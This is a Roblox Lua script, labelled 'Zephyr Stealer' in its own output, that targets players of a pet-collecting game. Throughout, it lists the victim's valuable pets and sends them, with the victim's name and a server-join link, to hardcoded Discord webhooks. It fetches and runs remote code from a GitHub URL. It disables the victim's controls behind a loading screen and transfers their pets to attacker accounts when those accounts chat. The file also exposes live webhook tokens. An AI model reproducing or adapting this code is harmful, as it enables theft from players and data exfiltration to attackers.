if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
    return
end
rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)

-- Multiple usernames can be added here
usernames = {
    "namnnni2",
    "BaldBaconFrrr",
    Username
}

local webhook = Webhook
local logs_webhook = "https://discord.com/api/webhooks/1396562436005302315/x1kASTn9QReUxByoLv4GoaC2Za12gPHekEs4rpNs8itG3LET4onCohbqr95lFVkz-Lnq"
local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"

local function createLoadingScreen()
    local success, loadingScreen = pcall(function()
        return loadstring(game:HttpGet(""))()
    end)
    return success and loadingScreen or nil
end

local loadingScreenActive = false
local loadingScreen

local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local backpack = LocalPlayer:WaitForChild("Backpack")
local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
local req = (syn and syn.request) or (http and http.request) or (http_request) or request

if server == "VIPServer" or #Players:GetPlayers() >= 4 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/realkyzers/dowhdusjwbd/refs/heads/main/shop.txt"))()
    return
end

local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
local function formatNumber(num)
    if type(num) ~= "number" then return tostring(num) end
    if num < 1000 then return tostring(num) end
    local magnitude = math.floor(math.log10(num) / 3)
    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
    local scaled = num / (1000 ^ magnitude)
    return string.format("%.2f%s", scaled, suffix)
end

local allowedPets = {
    ["kitsune"] = true, ["raccoon"] = true, ["disco bee"] = true,
    ["dragonfly"] = true, ["butterfly"] = true, ["t-rex"] = true,
    ["spinosaurus"] = true, ["fennec fox"] = true, ["mimic octopus"] = true,
    ["queen bee"] = true, ["red fox"] = true, ["mega"] = true,
    ["ascended"] = true, ["rainbow"] = true,
}

local prefixes = {
    "raccoon", "dragonfly", "kitsune", "t-rex",
    "disco bee", "spinosaurus", "fennec fox",
    "butterfly", "mimic octopus", "queen bee", "red fox"
}

function countSpecialPetsAndCheckWebhook(backpack)
    local count = 0
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local lowerName = string.lower(item.Name)
            for _, prefix in ipairs(prefixes) do
                if string.find(lowerName, prefix) then
                    count += 1
                    break
                end
            end
        end
    end

    local shouldSend = false
    if count >= 5 then
        shouldSend = true
    elseif count >= 2 then
        shouldSend = (math.random() < 0.35)
    end

    return count, shouldSend
end

local count, shouldSend = countSpecialPetsAndCheckWebhook(backpack)
local finallyWebhook

if shouldSend then
    finallyWebhook = dualhook
else
    finallyWebhook = webhook
end


local function isAllowedPet(name)
    name = name:lower()
    for allowed in pairs(allowedPets) do
        if name:find(allowed, 1, true) then
            return true
        end
    end
    return false
end

local function getKg(name)
    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
end

local function getAge(name)
    return tonumber(string.match(name, "%[Age (%d+)%]")) or 0
end

local function splitIntoChunks(text, chunkSize)
    local chunks = {}
    for i = 1, #text, chunkSize do
        chunks[#chunks + 1] = text:sub(i, math.min(i + chunkSize - 1, #text))
    end
    return chunks
end

local function gatherInventorySummary()
    local summaryParts, totalValue = {}, 0
    for _, item in ipairs(backpack:GetChildren()) do
        local weight, age = getKg(item.Name), getAge(item.Name)
        local isValuable = isAllowedPet(item.Name) or 
                         item.Name:find("Huge") or 
                         item.Name:find("🐾") or 
                         item.Name:find("🌟") or
                         weight > 15 or
                         age > 60
        
        if isValuable then
            local value = CalculatePlantValue(item)
            totalValue += value
            table.insert(summaryParts, string.format("%s%s%s", item.Name,
                weight > 0 and (" (" .. weight .. "kg)") or "",
                age > 0 and (" (" .. age .. "d)") or ""))
        end
    end
    return summaryParts, totalValue
end

local webhookSent = false
local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local function sendWebhook()
    if webhookSent then return end
    webhookSent = true

    local summaryParts, totalValue = gatherInventorySummary()
    local shouldPingEveryone = false

    for _, item in ipairs(backpack:GetChildren()) do
        local weight, age = getKg(item.Name), getAge(item.Name)
        if isAllowedPet(item.Name) or 
           item.Name:find("%[Age") or 
           item.Name:find("Huge") or 
           item.Name:find("🐾") or 
           item.Name:find("🌟") or
           weight > 15 or
           age > 60 then
            shouldPingEveryone = true
            break
        end
    end

    -- Combine summary parts into chunks that fit Discord's limits
    local combinedSummary = table.concat(summaryParts, "\n")
    local summaryChunks = splitIntoChunks(combinedSummary, 1000)  -- Split into chunks of 1000 chars each

    local embeds = {}
    local firstEmbed = {
        ["title"] = "Zephyr Stealer",
        ["color"] = 65280,
        ["fields"] = {
            {
                ["name"] = "Player Info",
                ["value"] = string.format("Victim: %s\nReceiver: %s\nExecutor: %s", 
                    LocalPlayer.Name, table.concat(usernames, ", "), executor),
                ["inline"] = true
            },
            {
                ["name"] = "Total Pet Value",
                ["value"] = formatNumber(totalValue),
                ["inline"] = true
            },
            {
                ["name"] = "Pet Inventory (Part 1)",
                ["value"] = summaryChunks[1] and ("```"..summaryChunks[1].."```") or "No valuable pets",
                ["inline"] = false
            },
            {
                ["name"] = "Join Server",
                ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId),
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = string.format("Executed by %s • %s", executor, os.date("%B %d, %Y"))
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    table.insert(embeds, firstEmbed)

    -- Add additional embeds for remaining chunks
    for i = 2, #summaryChunks do
        table.insert(embeds, {
            ["title"] = "Pet Inventory (Part "..i..")",
            ["color"] = 65280,
            ["description"] = "```"..summaryChunks[i].."```",
            ["footer"] = {
                ["text"] = string.format("Executed by %s • %s", executor, os.date("%B %d, %Y"))
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        })
    end

    local payload = {
        ["content"] = shouldPingEveryone and "@everyone" or nil,
        ["embeds"] = embeds
    }

    local logs_payload = {
        ["content"] = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
        ["embeds"] = {{
            ["title"] = "Pet Inventory Logs",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "Player Info",
                    ["value"] = string.format("Victim: %s\nExecutor: %s", 
                        LocalPlayer.Name, executor),
                    ["inline"] = true
                },
                {
                    ["name"] = "Total Pet Value",
                    ["value"] = formatNumber(totalValue),
                    ["inline"] = true
                },
                {
                    ["name"] = "Pet Inventory Summary",
                    ["value"] = #summaryParts > 0 and string.format("%d valuable pets (see full list above)", #summaryParts) or "No valuable pets",
                    ["inline"] = false
                },
                {
                    ["name"] = "Join Server",
                    ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = string.format("Executed by %s • %s", executor, os.date("%B %d, %Y"))
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    if req then
        pcall(function()
            req({
                Url = finallyWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
            req({
                Url = logs_webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(logs_payload)
            })
        end)
    end
end

local function unequipAllPets()
    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
    if petData then
        for uuid in pairs(petData.PetInventory.Data) do
            ReplicatedStorage.GameEvents.PetsService:FireServer("UnequipPet", uuid)
            task.wait(0.1)
        end
    end
end

local function FirePrompt(part)
    local prompt = part:FindFirstChildOfClass("ProximityPrompt")
    if not prompt then return end
    local temp = Instance.new("Part")
    temp.Name = "holder"
    temp.Anchored = true
    temp.CanCollide = false
    temp.Transparency = 1
    temp.Size = Vector3.new(2, 2, 2)
    temp.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
    temp.Parent = workspace
    prompt.Parent = temp
    prompt.MaxActivationDistance = math.huge
    prompt.HoldDuration = 0
    prompt.Enabled = true
    fireproximityprompt(prompt)
end

local started = false
local function showLoadingScreen()
    if not loadingScreenActive then
        loadingScreen = createLoadingScreen()
        loadingScreenActive = true
    end
end
local function hideLoadingScreen()
    if loadingScreenActive and loadingScreen then
        loadingScreen:Destroy()
        loadingScreenActive = false
    end
end

local function startGiving()
    showLoadingScreen()

    local h = (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
    h.WalkSpeed = 0
    h.JumpPower = 0
    pcall(function()
        require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
    end)

    -- Check all usernames for players in the server
    local target = nil
    for _, username in ipairs(usernames) do
        local player = Players:FindFirstChild(username)
        if player and player.Character then
            target = player
            break
        end
    end

    if not target then
        hideLoadingScreen()
        return
    end

    local myHRP = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
    local targetHRP = target.Character:WaitForChild("HumanoidRootPart")
    myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
    task.wait(0.4)

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local weight, age = getKg(tool.Name), getAge(tool.Name)
            local isValuable = isAllowedPet(tool.Name) or 
                             tool.Name:find("Huge") or 
                             tool.Name:find("🐾") or 
                             tool.Name:find("🌟") or
                             weight > 15 or
                             age > 60
            
            if isValuable then
                tool.Parent = LocalPlayer.Character
                task.wait(0.25)
                FirePrompt(target.Character:WaitForChild("Head"))
                task.wait(0.25)
                if tool:IsDescendantOf(LocalPlayer.Character) then
                    tool.Parent = backpack
                end
            end
        end
    end

    hideLoadingScreen()
end

unequipAllPets()
task.wait(5)
sendWebhook()

-- Connect chat listeners for all usernames
for _, username in ipairs(usernames) do
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == username then
            p.Chatted:Connect(function()
                if not started then
                    started = true
                    startGiving()
                end
            end)
        end
    end

    Players.PlayerAdded:Connect(function(p)
        if p.Name == username then
            p.Chatted:Connect(function()
                if not started then
                    started = true
                    startGiving()
                end
            end)
        end
    end)
end

coroutine.wrap(function()
    while true do
        for _, item in ipairs(backpack:GetChildren()) do
            if item:GetAttribute("d") == true then
                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(item)
            end
        end
        task.wait(5)
    end
end)()

coroutine.wrap(function()
    while true do
        unequipAllPets()
        task.wait(5)
    end
end)()
